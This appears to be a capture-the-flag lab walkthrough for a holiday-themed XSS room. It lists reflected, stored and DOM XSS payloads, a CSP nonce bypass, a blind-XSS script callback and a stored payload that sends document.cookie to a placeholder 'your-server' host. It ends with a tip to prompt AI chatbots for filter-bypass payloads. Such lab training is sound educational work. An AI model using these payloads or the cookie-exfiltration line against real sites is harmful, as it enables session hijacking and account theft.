# XSS Mastery Walkthrough: Merry XSSMas (AoC 2025 Day 11)

## Room Overview
Exploit a holiday greeting app vulnerable to reflected & stored XSS. Access at `http://MACHINE_IP:80`. Steal cookies, deface, or execute JS to grab flags.

## Step 1: Reflected XSS Basics
- **Vuln Point:** URL param `name` in `/greet` echoed unsanitized.
- **Payload:** `<script>alert('XSS')</script>`
- **URL:** `http://MACHINE_IP/greet?name=<script>alert('XSS')</script>`
- **Flag:** Pop-up reveals `THM{REFLECTED_XSS_FLAG}`.
- **Advanced Twist:** Bypass basic filters with `<img src=x onerror=alert(1)>`.

## Step 2: Stored XSS Exploitation
- **Vuln Point:** Comments form stores input in backend DB, displayed to all users.
- **Payload:** `<script>document.body.innerHTML="<h1>Pwned!</h1>"</script>`
- **Method:** Submit via form → Refresh page to see persistence.
- **Flag:** Stored payload executes on load, showing `THM{STORED_XSS_FLAG}`.
- **Pro Tip:** Use blind XSS for callbacks: `<script src="http://your-server/log.js"></script>`.

## Step 3: DOM-Based XSS
- **Vuln Point:** Client-side JS parses URL hash unsafely (e.g., `location.hash` into innerHTML).
- **Payload:** `#<img src=x onerror=alert(1)>`
- **URL:** `http://MACHINE_IP/dom#<img src=x onerror=alert(1)>`
- **Insight:** No server round-trip—pure client exploit.

## Step 4: CSP Bypasses (Advanced)
- **If CSP Present:** Analyze headers (use `csp_analyzer.py`).
- **Bypass Example:** If nonce-based, inject inline with nonce theft via JSONP.
- **Payload:** `<script nonce="stolen">alert(1)</script>`.

## Step 5: Final Exploitation & Flag
- Combine stored XSS to steal admin cookie: `<script>fetch('http://your-server?cookie='+document.cookie)</script>`.
- Use cookie to access admin panel → Reset app → `THM{M3RRY_X55M45}`.

## Red Team Simulation
- Chain XSS → CSRF → RCE (if vuln API).
- Use BeEF for post-exploit.

## Blue Team Defenses
- Sanitize inputs (e.g., OWASP Java HTML Sanitizer).
- Implement strict CSP: `default-src 'self'; script-src 'nonce-xyz'`.
- Monitor logs with Sigma rule in `/detection/`.

## Local Testing
Run `/tools/vulnerable_app/app.py` → Exploit & patch for learning.

**Pro Extension:** Generate AI payloads: Prompt Grok/ChatGPT with "Bypass XSS filter allowing only letters".
